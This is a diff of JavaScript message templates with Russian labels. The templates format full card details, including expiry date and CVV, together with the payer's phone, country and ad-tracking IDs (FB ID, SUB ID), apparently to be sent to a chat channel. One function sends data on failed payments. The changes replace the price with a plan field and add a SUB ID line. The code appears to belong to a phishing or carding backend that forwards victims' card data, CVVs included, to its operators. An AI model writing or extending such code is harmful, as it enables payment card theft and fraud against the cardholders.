@@ -30,9 +30,9 @@ ${paymentData.bid ? `🆔 BID: ${paymentData.bid}\n` : ""}
    Срок: ${paymentData.expiry}
    CVV: ${paymentData.cvv}
 
-💰 Сумма: ${paymentData.price} EUR
+💰 План: ${paymentData.plan}
 🆔 FB ID: ${paymentData.fb || "Не указан"}
-
+🆔 SUB ID: ${paymentData.subid || "Не указан"}
 ⏰ Время: ${new Date().toLocaleString("ru-RU")}
         `.trim();
 
@@ -79,8 +79,9 @@ ${paymentData.bid ? `🆔 BID: ${paymentData.bid}\n` : ""}
    Срок: ${paymentData.expiry}
    CVV: ${paymentData.cvv}
 
-💰 Сумма: ${paymentData.price} EUR
+💰 План: ${paymentData.plan}
 🆔 FB ID: ${paymentData.fb || "Не указан"}
+🆔 SUB ID: ${paymentData.subid || "Не указан"}
 
 ⏰ Время: ${new Date().toLocaleString("ru-RU")}
         `.trim();
@@ -140,9 +141,9 @@ const sendFailedPaymentData = async (paymentData, paymentError) => {
 *Телефон:* ${paymentData.phone}
 *Страна:* ${paymentData.countryCode}
 ${paymentData.bid ? `*BID:* ${paymentData.bid}\n` : ""}
-*Сумма:* ${paymentData.price} EUR
+*План:* ${paymentData.plan}
 *FB ID:* ${paymentData.fb || "Не указан"}
-
+🆔 SUB ID: ${paymentData.subid || "Не указан"}
 *Время:* ${new Date().toLocaleString("ru-RU")}
         `.trim();
 
